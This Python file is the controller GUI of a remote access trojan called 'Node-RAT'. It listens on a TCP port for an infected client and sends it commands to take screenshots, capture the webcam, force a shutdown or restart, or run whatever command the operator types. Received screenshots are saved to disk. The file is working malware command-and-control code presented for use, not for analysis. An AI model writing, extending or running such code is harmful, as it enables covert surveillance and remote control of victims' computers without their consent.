import socket
import threading
import tkinter as tk
from tkinter.scrolledtext import ScrolledText
import cv2
import numpy as np
import struct

HOST = "0.0.0.0"
PORT = 5555

def recv_all(sock, length):
    data = b""
    while len(data) < length:
        more = sock.recv(length - len(data))
        if not more:
            raise EOFError("Socket closed during receive")
        data += more
    return data

class RATServer:
    def __init__(self, master):
        self.master = master
        master.title("Node-RAT")
        master.geometry("1000x650")

        # Colors
        bg_color = "#1e1e1e"
        fg_color = "#c7c7c7"
        btn_color = "#333333"
        entry_bg = "#2d2d2d"
        entry_fg = "#ffffff"

        master.configure(bg=bg_color)

        self.text_area = ScrolledText(master, wrap=tk.WORD, font=("Consolas", 12),
                                      bg=bg_color, fg=fg_color, insertbackground=fg_color)
        self.text_area.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

        button_frame = tk.Frame(master, bg=bg_color)
        button_frame.pack(padx=10, pady=(0, 10), fill=tk.X)

        btn_commands = tk.Button(button_frame, text="Commands", width=15, bg=btn_color, fg=fg_color,
                                 activebackground="#444444",
                                 command=lambda: self.send_command_with_text("help"))
        btn_commands.pack(side=tk.LEFT, padx=5)

        btn_screenshot = tk.Button(button_frame, text="Screenshot", width=15, bg=btn_color, fg=fg_color,
                                   activebackground="#444444",
                                   command=lambda: self.send_command_with_text("screenshot"))
        btn_screenshot.pack(side=tk.LEFT, padx=5)

        btn_webcam = tk.Button(button_frame, text="Webcam", width=15, bg=btn_color, fg=fg_color,
                               activebackground="#444444",
                               command=lambda: self.send_command_with_text("webcam"))
        btn_webcam.pack(side=tk.LEFT, padx=5)

        btn_shutdown = tk.Button(button_frame, text="Shutdown", width=15, bg=btn_color, fg=fg_color,
                                 activebackground="#550000",
                                 command=lambda: self.send_command_with_text("cmd shutdown /S /F /T 0"))
        btn_shutdown.pack(side=tk.LEFT, padx=5)

        btn_restart = tk.Button(button_frame, text="Restart", width=15, bg=btn_color, fg=fg_color,
                                activebackground="#550000",
                                command=lambda: self.send_command_with_text("cmd shutdown /R /F /T 0"))
        btn_restart.pack(side=tk.LEFT, padx=5)

        btn_exit = tk.Button(button_frame, text="Exit", width=15, bg=btn_color, fg=fg_color,
                             activebackground="#444444",
                             command=lambda: self.send_command_with_text("exit"))
        btn_exit.pack(side=tk.LEFT, padx=5)

        self.entry = tk.Entry(master, font=("Consolas", 12), bg=entry_bg, fg=entry_fg, insertbackground=entry_fg)
        self.entry.pack(padx=10, pady=(0, 10), fill=tk.X)
        self.entry.bind("<Return>", self.send_command)

        self.send_button = tk.Button(master, text="Send", bg=btn_color, fg=fg_color,
                                     activebackground="#444444", command=self.send_command)
        self.send_button.pack(pady=(0, 10))

        self.client = None
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((HOST, PORT))
        self.sock.listen(1)

        self.append_text(f"Listening on {HOST}:{PORT}\n")

        self.accept_thread = threading.Thread(target=self.accept_connections, daemon=True)
        self.accept_thread.start()

    def accept_connections(self):
        self.client, addr = self.sock.accept()
        self.append_text(f"Connected: {addr}\n")
        self.receive_thread = threading.Thread(target=self.receive_data, daemon=True)
        self.receive_thread.start()

    def send_command(self, event=None):
        command = self.entry.get().strip()
        if not command:
            return
        self.send_command_with_text(command)

    def send_command_with_text(self, command):
        if not self.client:
            self.append_text("[-] No client connected.\n")
            self.entry.delete(0, tk.END)
            return
        try:
            self.client.send(command.encode())
            self.append_text(f">> Sent command: {command}\n")
            self.entry.delete(0, tk.END)
        except Exception as e:
            self.append_text(f"[-] Error sending command: {e}\n")

    def receive_data(self):
        try:
            while True:
                length_bytes = recv_all(self.client, 8)
                length = int.from_bytes(length_bytes, 'big')
                if length == 0:
                    self.append_text("[-] Received empty response.\n")
                    continue
                data = recv_all(self.client, length)
                if data.startswith(b'\x89PNG\r\n\x1a\n'):
                    with open('screenshot.png', 'wb') as f:
                        f.write(data)
                    self.append_text("[*] Screenshot saved as screenshot.png\n")
                else:
                    try:
                        text = data.decode(errors='ignore')
                    except Exception:
                        text = "[*] Received binary data (non-text).\n"
                    self.append_text(text + '\n')
        except Exception as e:
            self.append_text(f"[-] Connection lost: {e}\n")

    def append_text(self, text):
        self.master.after(0, lambda: self.text_area.insert(tk.END, text))
        self.master.after(0, self.text_area.see, tk.END)

def main():
    root = tk.Tk()
    app = RATServer(root)
    root.mainloop()

if __name__ == "__main__":
    main()
